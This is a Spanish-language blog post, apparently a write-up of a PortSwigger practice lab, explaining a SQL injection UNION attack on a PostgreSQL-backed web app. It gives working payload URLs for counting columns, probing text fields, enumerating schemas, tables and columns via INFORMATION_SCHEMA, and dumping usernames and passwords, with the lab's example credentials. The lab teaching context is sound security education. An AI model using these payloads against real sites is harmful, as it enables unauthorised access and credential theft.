---
title: SQL Injection UNION Attack.
date: '2023-03-29'
tags: ['HACKING', 'SQL', 'SQL INJECTION']
draft: false
summary: El fin de este ataque es aprovechar algún elemento de la página web que esté renderizando información que llega directamente de la BD para extraer información. Si la aplicación es vulnerable a SQL Injection (SQLi) y somos capaces de determinar cuantas columnas está devolviendo la consulta SQL original podremos utilizar la palabra reservada *UNION* de SQL para concatenar en la salida de la consulta información extra de otras tablas de la base de datos.
images: ['/static/images/sqli-union-attack/twitter-card.png']
---

El fin de este ataque es aprovechar algún elemento de la página web que esté renderizando información que llega directamente de la BD para extraer información. Si la aplicación es vulnerable a SQL Injection (SQLi) y somos capaces de determinar cuantas columnas está devolviendo la consulta SQL original podremos utilizar la palabra reservada *UNION* de SQL para concatenar en la salida de la consulta información extra de otras tablas de la base de datos.

Doy por hecho que el lector tiene conocimientos sobre lo que es un SQLi, conocimientos básicos de como funciona el ataque y conocimientos básicos de SQL.

Las siguientes explicaciones se basarán en la idea de que tenemos una aplicación web la cual recibe como un parámetro en la url un valor que se utiliza para filtrar en una consulta SQL. Para hacer el post mas visual usaremos los laboratorios de [https://portswigger.net/](https://portswigger.net/) en concreto el laboratorio ****Lab: SQL injection attack, listing the database contents on non-Oracle databases.****

Importante recalcar que el laboratorio es una BD non-Oracle, para Oracle las consultas cambiarían un poco ya que siempre se necesita que se especifique una tabla en la consulta. Para ello se usa la tabla *Dual* (`[sqli] from Dual — -`) 

Este laboratorio es una aplicación web que recibe como parámetro una categoría que se usa para filtrar los resultados de la página.

![Query param](/static/images/sqli-union-attack/1.png)

Los resultados que se ven en la parte de abajo de la imagen son el resultado de la consulta SQL, probablemente la consulta que se esté haciendo sea algo similar a la siguiente:

```sql
SELECT title, body
FROM Table
WHERE category LIKE ‘Pets’
```

El campo _title_ de la consulta sería *Fur Babies* y el _body_ el resto del texto que aparece debajo del titulo.

## Enumerar la cantidad de columnas de la consulta original.

Lo primero que debemos hacer, después de comprobar que la aplicación es vulnerable a SQLi, es enumerar el número de columnas de la consulta original. Esto es necesario para poder concatenarle al resultado de la consulta aquellos datos que nosotros como atacantes quisiéramos extraer de la BD.

Para ello lo más sencillo es intentar ordenar el resultado por el número de columnas:

`/filter?category=Pets' ORDER BY 2 -- -`

Mientras usemos un número de columna válido la web seguirá funcionando, en el momento en el que pongamos un número de columna que no exista la aplicación se romperá. Por ejemplo, si usamos `3` en lugar de `2` la aplicación muestra un mensaje de error. Eso nos da la información de que en la consulta original existen dos columnas.

## Identificar qué campos son válidos para extraer datos

Gracias a la enumeración de columnas sabemos que existen dos columnas en la consulta por lo que podríamos empezar a concatenar información en la consulta sin obtener error por parte de la aplicación:

`/filter?category=Pets' UNION SELECT NULL, NULL -- -`

Los valores nulos representan las columnas que podemos usar para extraer información de la BD, como por ejemplo la versión de la BD:

`/filter?category=Pets' UNION SELECT version(), NULL -- -`

En medio del texto de la web podremos ver el siguiente texto:

**PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit**

¡La versión de la BD que está corriendo por detrás de la web!

Nótese que estamos usando `version()` porque es un PostgreSQL, deberemos adaptar nuestras consultas SQL según el motor de BD que corra por detrás de la web. PortSwigger tiene una cheatsheet bastante buena para las diferencias más comunes entre motores de BD [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

En el ejemplo anterior hemos podido extraer la versión de la BD sin problemas pero debemos saber que **no todos los campos de la consulta pueden ser validos para extraer texto**, si la columna es un tipo de dato numérico (int) no podremos usarlo para extraer texto. La forma más sencilla de identificar que campos podemos usar para extraer información es la siguiente:

`/filter?category=Pets' UNION SELECT 'A', NULL -- -`

`/filter?category=Pets' UNION SELECT NULL, 'A' -- -`

En caso de que por ejemplo, la segunda columna sea de tipo numérico la aplicación se romperá al ejecutar la consulta.

En caso de que solo una de los campos nos permita extraer texto y queramos extraer información de más de una columna podemos jugar con la función `concat()` para mostrar N columnas sobre un mismo campo:

`/filter?category=Pets' UNION SELECT concat(version(), ':',``current_database()), NULL -- -`

En la consulta anterior nos aparecería la versión de la BD junto con el nombre de la base de datos actual separado por el delimitador “:”. No todos los motores de BD tienen el método `concat()` pero todos ellos nos permite extrapolar cadenas de una forma u otra. La cheatsheet que nombre anteriormente tiene también diferentes formas de concatenar datos en función del motor de BD.

## Enumerar bases de datos, tablas y columnas

La información más relevante de la BD se encuentra dentro de las tablas. Para poder montar las consultas que nos extraigan los datos debemos conocer la estructura interna de la BD, nombres de las BBDD, nombres de tablas y nombres de columnas. Para ello, podemos usar la tabla `INFORMATION_SCHEMA` para, de forma progresiva, extraer todo.

Para enumerar las bases de datos del servidor:

`/filter?category=Accessories' UNION SELECT schema_name, NULL FROM INFORMATION_SCHEMA.SCHEMATA -- -`

En la anterior inyección SQL estamos usando la tabla `INFORMATION_SCHEMA` para enumerar las bases de datos que están en el servidor.

`INFORMATION_SCHEMA` es la base de datos donde se guarda la información sobre todas las demás bases de datos, por ejemplo; nombres de las bases de datos o una tabla, su tipo de columna, privilegios de acceso, etc. Se trata de una base de datos virtual integrada con el único propósito de proporcionar información sobre el propio sistema de base de datos.

Al ejecutar la inyección podemos visualizar en el contenido de la web los nombres de las bases de datos (pg_catalog, public y information_schema):

![Enumeracion de bases de datos](/static/images/sqli-union-attack/2.png)

Una vez conocemos la BD es hora de conocer las tablas que contiene, una vez más usando la tabla `INFORMATION_SCHEMA` extraemos la información:

`/filter?category=Accessories/filter?category=Accessories' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema LIKE 'public' -- -`

![Enumeracion de tablas](/static/images/sqli-union-attack/3.png)

Vemos que la BD *public* contiene dos tablas, *products* y *users_dcpwdo.* Como el fin del laboratorio es extraer las credenciales del usuario administrador vamos a por la tabla de usuarios. Lo único que nos falta por saber para poder extraer la información de esta tabla son las columnas que contiene.

`/filter?category=Accessories' UNION SELECT column_name, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 'users_dcpwdo' -- -`

![Enumeracion de columnas](/static/images/sqli-union-attack/4.png)

Enumeramos dos columnas en la tabla: *password_gwmnts* y *username_jxwprc.* Con esta información solo queda hacer una consulta normal a la tabla y extraer la información.

`/filter?category=Accessories' UNION SELECT username_jxwprc, password_gwmnts FROM users_dcpwdo -- -`

No saqué captura del resultado de la última inyección pero el resultado que se ve por pantalla son los usuarios que contiene la tabla de usuarios, entre ellos el usuario administrador.

Cabe destacar que es posible que no todas los campos de la consulta sean compatibles para extraer texto, como comentamos anteriormente en la enumeración de columnas. En ese caso podemos jugar con la función `concat()` para que en un mismo campo nos muestre información de N columnas.

`/filter?category=Accessories' UNION SELECT concat(username_jxwprc, ':', password_gwmnts), NULL FROM users_dcpwdo -- -`

El resultado de la consulta sería algo parecido a esto:

`wiener:g4l778876wfucwa6q82g`

`administrator:dau3lmcllq0h9oh314kn`

Pues solo nos queda hacer login y resolver el laboratorio.

![Lab solved](/static/images/sqli-union-attack/5.png)

Gracias por leer.